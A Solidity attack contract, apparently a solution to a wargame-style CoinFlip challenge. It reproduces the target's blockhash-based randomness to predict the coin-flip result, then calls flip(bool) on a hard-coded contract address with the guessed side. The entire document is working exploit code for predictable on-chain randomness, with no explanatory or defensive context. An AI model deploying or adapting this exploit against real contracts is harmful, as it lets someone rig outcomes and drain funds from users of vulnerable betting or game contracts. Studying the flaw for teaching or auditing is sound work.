// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attackFlip {
    address coinFlipContractAddress =
        0x901e25cd65c97Fc2DD5f31659a0007b3C389f937;

    function attack() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        (bool success, bytes memory data) = coinFlipContractAddress.call(
            abi.encodeWithSignature("flip(bool)", side)
        );

        require(success, "transaction failed when calling");
    }
}
